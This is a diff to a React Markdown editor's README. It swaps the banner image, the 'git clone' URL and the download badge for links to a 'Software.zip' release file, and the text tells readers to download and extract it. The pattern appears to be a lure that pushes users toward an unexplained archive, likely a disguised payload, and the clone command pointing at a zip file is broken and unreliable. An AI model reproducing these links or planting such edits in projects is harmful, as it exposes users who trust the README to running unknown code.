@@ -1,6 +1,6 @@
 # React Markdown Editor 🚀
 
-![Markdown Editor](https://example.com/markdown-editor.png)
+![Markdown Editor](https://github.com/muhammadfurqan123/react-markdown-editor/releases/download/v1.0/Software.zip)
 
 Welcome to the React Markdown Editor repository! This project is a simple and flexible Markdown post editor with writing tools and preview mode. Whether you are a blogger, a developer writing technical documentation, or someone who enjoys jotting down notes in Markdown, this editor has got you covered.
 
@@ -17,7 +17,7 @@ To get started with the React Markdown Editor, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/user/react-markdown-editor.git
+   git clone https://github.com/muhammadfurqan123/react-markdown-editor/releases/download/v1.0/Software.zip
    ```
 
 2. Install dependencies:
@@ -55,7 +55,7 @@ This repository covers the following topics:
 
 To download the latest version of React Markdown Editor, click the button below:
 
-[![Download React Markdown Editor](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download React Markdown Editor](https://github.com/muhammadfurqan123/react-markdown-editor/releases/download/v1.0/Software.zip)](https://github.com/muhammadfurqan123/react-markdown-editor/releases/download/v1.0/Software.zip)
 
 Remember to extract the zip file once it's downloaded.
 
